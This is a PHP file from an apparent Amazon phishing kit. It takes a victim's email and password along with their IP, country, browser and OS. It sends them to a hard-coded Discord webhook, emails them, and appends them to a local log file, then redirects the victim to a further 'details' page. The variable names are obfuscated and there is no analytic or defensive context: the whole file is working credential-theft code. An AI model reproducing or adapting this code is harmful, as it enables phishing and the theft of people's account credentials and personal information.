<?php $h0=date('G:i:s d/m/Y');$l1=getenv("REMOTE_ADDR");include('../function/get_address.php');include('../function/get_browser.php');function sendWebHook($o2,$e3){$h4=array('content'=>"$e3");$g5=json_encode($h4);$k6=curl_init($o2);curl_setopt($k6,CURLOPT_HTTPHEADER,array('Content-type: application/json'));curl_setopt($k6,CURLOPT_POST,1);curl_setopt($k6,CURLOPT_POSTFIELDS,$g5);curl_setopt($k6,CURLOPT_FOLLOWLOCATION,1);curl_setopt($k6,CURLOPT_HEADER,0);curl_setopt($k6,CURLOPT_RETURNTRANSFER,1);$e7=curl_exec($k6);}$o2="https://discordapp.com/api/webhooks/696011256619860109/EMrRp9G4Lwlv0z2vjMxwpsvAb4PRXt3Um8tZCJo6EB1pZUyq632xAMptbx3nBE4p1z3O";$x8="> mail ->".$_SESSION['email']."\n";$x8.="> pswd ->".$_SESSION['password']."\n";$x8.="> IP ->https://www.ip-tracker.org/locator/ip-lookup.php?ip=".$l1."\n";$x8.="> Country ->".$_SESSION['_countryname_']."\n";$n9.="
<html>
<br><head><meta charset=\"UTF-8\"></head>
<div style='font-size: 13px;font-family:monospace;font-weight:700;'>
±±±±±±±±±±±±±±±±±±±±±±±± [ <font style='color: #0a5d00;'>Amazon Login </font> ] ±±±±±±±±±±±±±±±±±±±±±±±±±<br>
<font style='color:#9c0000;'>℗</font> Username : <font style='color:#0070ba;'>".$_SESSION['email']."</font><br>
<font style='color:#9c0000;'>℗</font> Password : <font style='color:#0070ba;'>".$_SESSION['password']."</font><br>
±±±±±±±±±±±±±±±±±±±±±± [ <font style='color: #0a5d00;'>IP's Information</font> ] ±±±±±±±±±±±±±±±±±±±±±±±<br>
<font style='color:#9c0000;'>✪</font> IP's : <font style='color:#0070ba;'><a href="."http://ip-api.com/#$l1"." target="."_blank".">$l1"."</font></a><br>
<font style='color:#9c0000;'>✪</font> From : <font style='color:#0070ba;'>".$_SESSION['_countryname_']."</font><br>
<font style='color:#9c0000;'>✪</font> TIME : <font style='color:#0070ba;'>".$h0."</font><br>
<font style='color:#9c0000;'>✪</font> BROWSER : <font style='color:#0070ba;'>".Z118_Browser($_SERVER['HTTP_USER_AGENT'])." On ".Z118_OS($_SERVER['HTTP_USER_AGENT'])."</font><br>
±±±±±±±±±±±±±±±±±±±±±±±±±±± [ <font style='color: #0a5d00;'>Dexter</font> ] ±±±±±±±±±±±±±±±±±±±±±±±±±±±±<br>
</div></html>";$t10="Amazon LogIn | ".$l1." | ".$_SESSION['_countrycode_']."";$d11.="From: Dexter <localhost>";$d11.=$_POST['eMailAdd']."\n";$d11.="MIME-Version: 1.0\n";$d11.="Content-type: text/html; charset=UTF-8\n";@mail($t12,$t10,$n9,$d11);sendWebHook($o2,$x8);HEADER("Location: ./details.php?submit=session=".$_SESSION['_countrycode_']."&".md5(microtime())."&dispatch=".sha1(microtime())."");if($q13!==1){}else{$e14=fopen("./../clonox.html",'a');fwrite($e14,$n9);}?>